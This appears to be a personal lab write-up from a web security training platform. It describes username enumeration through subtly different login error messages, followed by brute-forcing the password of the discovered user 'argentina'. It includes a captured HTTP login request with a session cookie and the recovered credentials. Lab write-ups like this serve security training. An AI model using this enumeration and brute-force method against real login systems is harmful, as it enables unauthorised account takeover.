---
tags:
  - authn
---
# Username enumeration via subtly different responses

1. Try logging in with generic credentials and note the error message

![[attachments/authn-lab-2/file-20260204165355823.png]]

2. Note the slight difference in the response with username "argentina"

![[attachments/authn-lab-2/file-20260204165805342.png]]

3. Brute force passwords for the "argentina" user

```
POST /login HTTP/1.1
Host: 0a040031047729f880d9c6bb00900001.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Origin: https://0a040031047729f880d9c6bb00900001.web-security-academy.net
Connection: close
Referer: https://0a040031047729f880d9c6bb00900001.web-security-academy.net/login
Cookie: session=iU1mNC9RlDWaFvH9hEyrVZ3jFsJ1DttN
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
X-PwnFox-Color: blue
Priority: u=0, i

username=argentina&password=chelsea
```

